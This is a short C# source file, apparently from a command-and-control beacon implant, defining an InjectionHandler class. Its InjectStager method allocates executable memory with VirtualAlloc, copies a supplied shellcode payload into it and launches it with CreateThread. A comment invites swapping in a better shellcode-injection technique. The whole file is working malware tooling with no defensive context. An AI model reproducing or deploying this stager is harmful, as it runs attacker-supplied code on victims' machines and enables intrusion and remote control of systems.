using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Beacon.Handlers
{
    public class InjectionHandler
    {
        //This can be replaced with a better alternative of shellcode injection

        private const uint PAYLOAD_MAX_SIZE = 512 * 1024;
        private const uint MEM_COMMIT = 0x1000;
        private const uint PAGE_EXECUTE_READWRITE = 0x40;

        public static uint InjectStager(byte[] payload)
        {
            uint threadId = 0;
            IntPtr addr = VirtualAlloc(0, PAYLOAD_MAX_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

            Marshal.Copy(payload, 0, addr, payload.Length);
            CreateThread(0, 0, addr, IntPtr.Zero, 0, ref threadId);

            return threadId;
        }

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
            uint lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr param,
            uint dwCreationFlags,
            ref uint lpThreadId
        );

        [DllImport("kernel32")]
        private static extern IntPtr VirtualAlloc(
            uint lpStartAddr,
            uint size,
            uint flAllocationType,
            uint flProtect
        );


    }
}
